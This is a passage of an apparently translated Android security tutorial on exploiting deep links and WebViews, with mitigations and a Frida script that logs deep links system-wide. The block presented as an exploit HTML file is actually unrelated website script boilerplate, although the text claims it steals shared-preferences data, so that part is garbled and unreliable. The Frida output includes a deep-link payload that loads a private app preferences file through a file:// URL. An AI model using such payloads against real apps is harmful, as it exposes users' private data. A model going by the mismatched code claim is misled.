          obj.setAttribute('data-settings', obj.getAttribute('data-cmplz-elementor-settings'));
          blockedContentContainers.push(obj);
        });

        document.querySelectorAll(selectorGeneric).forEach(obj => {
          let elementService = obj.getAttribute('data-service');
          if ( cmplz_is_service_denied(elementService) ) {
            return;
          }
          if (obj.classList.contains('cmplz-elementor-activated')) return;

          if (obj.classList.contains('cmplz-fb-video')) {
            obj.classList.remove('cmplz-fb-video');
            obj.classList.add('fb-video');
          }

          obj.classList.add('cmplz-elementor-activated');
          obj.setAttribute('data-href', obj.getAttribute('data-cmplz-elementor-href'));
          blockedContentContainers.push(obj.closest('.elementor-widget'));
        });

        /**
         * Trigger the widgets in Elementor
         */
        for (var key in blockedContentContainers) {
          if (blockedContentContainers.hasOwnProperty(key) && blockedContentContainers[key] !== undefined) {
            let blockedContentContainer = blockedContentContainers[key];
            if (elementorFrontend.elementsHandler) {
              elementorFrontend.elementsHandler.runReadyTrigger(blockedContentContainer)
            }
            var cssIndex = blockedContentContainer.getAttribute('data-placeholder_class_index');
            blockedContentContainer.classList.remove('cmplz-blocked-content-container');
            blockedContentContainer.classList.remove('cmplz-placeholder-' + cssIndex);
          }
        }

      });



            document.addEventListener("cmplz_enable_category", function () {
                document.querySelectorAll('[data-rocket-lazyload]').forEach(obj => {
                    if (obj.hasAttribute('data-lazy-src')) {
                        obj.setAttribute('src', obj.getAttribute('data-lazy-src'));
                    }
                });
            });



  let cmplzBlockedContent = document.querySelector('.cmplz-blocked-content-notice');
  if ( cmplzBlockedContent) {
          cmplzBlockedContent.addEventListener('click', function(event) {
            event.stopPropagation();
        });
  }
});</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/premium-wrapper-link.min.js?m=1714256550' defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-core.min.js?ver=1.23.0" id="prismjs_core-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/autoloader/prism-autoloader.min.js?ver=1.23.0" id="prismjs_loader-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js?ver=1.23.0" id="prismjs_normalize-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/line-numbers/prism-line-numbers.min.js?ver=1.23.0" id="prismjs_line_numbers-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/toolbar/prism-toolbar.min.js?ver=1.23.0" id="prismjs_toolbar-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js?ver=1.23.0" id="prismjs_copy_to_clipboard-js" defer></script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJydkDkOwkAMRW9DReIEAakizjKLGZx4Fs1C4PZMEEUqhCi//Z+/7SU05BQXjQmmBGSFwcReaNStJddOab+ERnmX0WUIXAy5BMhoq/axCdGDSAnzG19QBqHmtdrG4jJZ3EzZBmlKGe7otI9QW8Hz80rM1YMx/8BENFitYt3hr6Qv15lSpcRoQBZiDTfv5/oap/HxoS527IfuPBwPp67bKTn2L4f7es0=' defer></script><script type="rocketlazyloadscript" data-rocket-src="https://8ksec.io/wp-content/plugins/gutenberg/build/i18n/index.min.js?ver=5baa98e4345eccc97e24" id="wp-i18n-js" defer></script><script type="rocketlazyloadscript" id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script><script id="elementor-pro-frontend-js-before">
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"a9bd38c197","urls":{"assets":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/8ksec.io\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
</script><script src="https://8ksec.io/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.7.7" id="elementor-pro-frontend-js" defer></script><script src="https://8ksec.io/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.7.7" id="pro-elements-handlers-js" defer></script><script id="elementskit-elementor-js-extra">
var ekit_config = {"ajaxurl":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"66428ff64b"};
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJydjFEKgzAQBW/jV+MSKQY/pGeJ6SIvTVZxV3L9WugJ/JuBYdru0ibGYrSXc4UoceF6uX5grsCYGt4rmxIERlH1x1kpCmo0dglHKtxXSJ/10e4P/912XJ9XnX3wz2Gawui7tMz+C/G3Pzk=' defer></script><script type="text/plain"              data-category="statistics">window['gtag_enable_tcf_support'] = false;
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '', {
  cookie_flags:'secure;samesite=none',

});
</script><script>window.lazyLoadOptions=[{elements_selector:"img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}},{elements_selector:".rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,}];window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://8ksec.io/wp-content/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.min.js"></script><script>function lazyLoadThumb(e,alt){var t='<img loading="lazy" data-lazy-src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"><noscript><img loading="lazy" src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"></noscript>',a='<button class="play" aria-label="play Youtube video"></button>';t=t.replace('alt=""','alt="'+alt+'"');return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.parentNode.dataset.query.length?'':'&'+this.parentNode.dataset.query;e.setAttribute("src",t.replace("ID",this.parentNode.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.parentNode.replaceChild(e,this.parentNode)}document.addEventListener("DOMContentLoaded",function(){var e,t,p,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id,a[t].dataset.alt),a[t].appendChild(e),p=e.querySelector('.play'),p.onclick=lazyLoadYoutubeIframe});</script></body>
  </html>
```  
  
这里我们需要将html文件托管在我们控制的服务器上，然后我们可以这样做：  
```
adb push exploit.html /sdcard/Downloads/
```  
  
这会将文件从我们的系统推送到受害设备。该代码尝试通过检索共享首选项文件并将其发送到远程服务器来从 Android 设备中窃取敏感数据。  
  
另一个示例场景是将错误与弱 URL 验证链接起来，然后从共享首选项中获取内容。  
  
减轻：  
- 确保始终清理传递到 JavaScript 的外部数据。  
  
- 在将域及其内容加载到 Web 视图之前，请始终验证它们。恶意内容可能会导致在加载域的移动应用程序上下文中执行 JavaScript。  
  
- 建议开发人员使用 Chrome 自定义选项卡 ，这样即使发生 javascript 执行，也会在自定义选项卡的上下文中在 Chrome 浏览器中加载域。这减少了攻击的影响。  
  
- 如果浏览体验没有恶化，那么开发人员还可以使用  受信任的 Web 活动 来减少攻击的影响。  
  
- 如果 setJavaScriptEnabled 属性已设置为 true，则应对加载的 javascript 进行严格验证。  
  
- 另请确保将以下标志设置为 false  
  
1.获取允许文件访问  
  
2.getAllowFileAccessFromFileURLs  
  
3.getAllowUniversalAccessFromFileURLs****  
  
**监控整个操作系统的深层链接**  
  
在使用自定义 OEM 和复杂应用程序时，有必要监控深层链接的使用情况。这对于确保定制 OEM 正常工作并进行适当的验证以及识别可能导致安全问题的任何隐藏深层链接非常重要。  
  
本文中可以看到此类问题的示例：  https://ssd-disclosure.com/ssd-advisory-galaxy-store-applications-installation-launching-without-user-interaction/  
  
为了监控整个系统的深层链接，我们将使用 frida 框架。要安装 frida 服务器和代理，我们可以参考此处的 frida 文档 https://frida.re/docs/android/，或者查看使用自动化的 FridaLoader ( https://github.com/dineshshetty/FridaLoader )我们的流程。  
  
设置必要的组件后，我们可以利用公开可用版本的增强版本 - 进行修改以处理密集型操作。  
```
//Modified version of <https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/>
//frida -U -p pid -l script.js
// Define a global object to store previously seen intents
var seenIntents = {};
Java.perform(function() {
    var Intent = Java.use("android.content.Intent");
    Intent.getData.implementation = function() {
        var action = this.getAction() !== null ? this.getAction().toString() : false;
        if (action) {
            // Create a unique key for the current intent by concatenating its action and data URI
            var key = action + '|' + (this.getData() !== null ? this.getData().toString() : '');
            // Check if this intent has been seen before
            if (seenIntents.hasOwnProperty(key)) {
                return this.getData();
            } else {
                // Mark this intent as seen by adding it to the global object
                seenIntents[key] = true;
                console.log("[*] Intent.getData() was called");
                console.log("[*] Activity: " + (this.getComponent() !== null ? this.getComponent().getClassName() : "unknown"));
                console.log("[*] Action: " + action);
                var uri = this.getData();
                if (uri !== null) {
                    console.log("\\n[*] Data");
                    uri.getScheme() && console.log("- Scheme:\\t" + uri.getScheme() + "://");
                    uri.getHost() && console.log("- Host:\\t\\t/" + uri.getHost());
                    uri.getQuery() && console.log("- Params:\\t" + uri.getQuery());
                    uri.getFragment() && console.log("- Fragment:\\t" + uri.getFragment());
                    console.log("\\n\\n");
                } else {
                    console.log("[-] No data supplied.");
                }
            }
        }
        return this.getData();
    }
});
```  
  
该脚本将监视整个系统的深层链接。  
  
找到system_server的pid：  
```
rosy:/ $ ps -A | grep -i system_server

system        1680   917 5040652 241828 SyS_epoll_wait      0 S system_server
```  
  
现在我们可以使用此命令附加到服务  
```
➜   frida -U -p  1680 -l deeplink3.js
          ____
         / _  |   Frida 16.0.10 - A world-class dynamic instrumentation toolkit
        | (_| |
         > _  |   Commands:
        /_/ |_|       help      -> Displays the help system
        . . . .       object?   -> Display information about 'object'
        . . . .       exit/quit -> Exit
        . . . .
        . . . .   More info at <https://frida.re/docs/home/>
        . . . .
        . . . .   Connected to Redmi 5 (id=b35097cf7d25)
     [Redmi 5::PID::1680 ]-> [*] Intent.getData() was called
     [*] Activity: com.android.fileexplorer.FileExplorerTabActivity
     [*] Action: android.intent.action.MAIN
     [-] No data supplied.
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   content://
     - Host:     /com.mi.android.globalFileexplorer.myprovider
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   content://
     - Host:     /com.mi.android.globalFileexplorer.myprovider
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.VIEW
     [*] Data
     - Scheme:   insecureshop://
     - Host:     /com.insecureshop
     - Params:   url=file:///data/data/com.insecureshop/shared_prefs/Prefs.xml
     [*] Intent.getData() was called
     [*] Activity: unknown
     [*] Action: android.intent.action.TIME_TICK
     [-] No data supplied.
```  
  
通过此脚本，我们可以监控跨系统的深层链接，并全面了解应用程序的功能，以及我们作为攻击者如何利用它  
  
现在我们已经深入了解了如何利用 Android 深层链接，请继续在 BuggyWebView 应用程序上尝试您的技能 –  https://github.com/dineshshetty/BuggyWebView。在评论中发表你的解决方案！  
  
**参考：**  
- https://developer.android.com/training/app-links/deep-linking  
  
- https://mas.owasp.org/MASTG/Android/0x05h-Testing-Platform-Interaction/#javascript-execution-in-webviews  
  
- https://blog.oversecured.com/Android-security-checklist-webview/  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
